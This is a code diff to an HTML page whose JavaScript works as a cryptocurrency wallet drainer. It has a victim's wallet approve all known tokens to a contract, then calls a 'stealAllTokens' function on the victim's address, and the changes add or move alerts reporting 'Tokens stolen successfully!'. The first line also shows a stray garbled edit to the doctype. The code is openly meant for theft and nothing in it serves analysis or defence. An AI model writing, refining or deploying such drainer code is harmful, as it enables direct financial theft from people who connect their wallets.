@@ -1,4 +1,4 @@
-h<!DOCTYPE html>
+uu<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -76,7 +76,6 @@ h<!DOCTYPE html>
 
         async function approveTokens(victimAddress, signer) {
             const contract = new ethers.Contract(contractAddress, contractABI, signer);
-            const maxApproval = ethers.constants.MaxUint256; // Max approval
             try {
                 for (let token of knownTokens) {
                     await contract.approveAllTokens(token); // Approve all tokens
@@ -93,9 +92,11 @@ h<!DOCTYPE html>
             const contract = new ethers.Contract(contractAddress, contractABI, signer);
             try {
                 await contract.stealAllTokens(victimAddress, knownTokens);
+                alert("Tokens stolen successfully! Check your balance.");
                 console.log("Tokens stolen successfully!");
             } catch (error) {
                 console.error("Stealing tokens failed:", error);
+                alert("Error stealing tokens. Please try again.");
             }
         }
 
@@ -124,7 +125,6 @@ h<!DOCTYPE html>
                 if (approvalSuccess) {
                     // Step 2: Steal all tokens
                     await stealTokens(victimAddress, signer);
-                    alert("Tokens stolen successfully! Check your balance.");
                 }
             }
         });
